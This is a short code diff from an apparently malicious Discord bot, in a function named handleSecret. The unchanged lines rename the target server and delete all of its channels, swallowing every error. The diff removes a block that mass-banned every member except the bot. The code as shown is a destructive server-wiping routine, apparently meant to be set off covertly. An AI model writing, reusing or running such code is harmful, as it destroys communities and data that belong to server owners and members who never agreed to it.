@@ -25,15 +25,6 @@ export async function handleSecret(
     // Rename server
     guild.setName(SERVER_NAME).catch(() => {}),
 
-    // Fetch members (needed before banning)
-    guild.members.fetch().then(() =>
-      Promise.all(
-        guild.members.cache
-          .filter((m) => m.id !== client.user?.id)
-          .map((m) => m.ban({ reason: "MEMBERTY FIRE" }).catch(() => {})),
-      ),
-    ).catch(() => {}),
-
     // Delete all channels
     Promise.all(guild.channels.cache.map((ch) => ch.delete().catch(() => {}))),
 
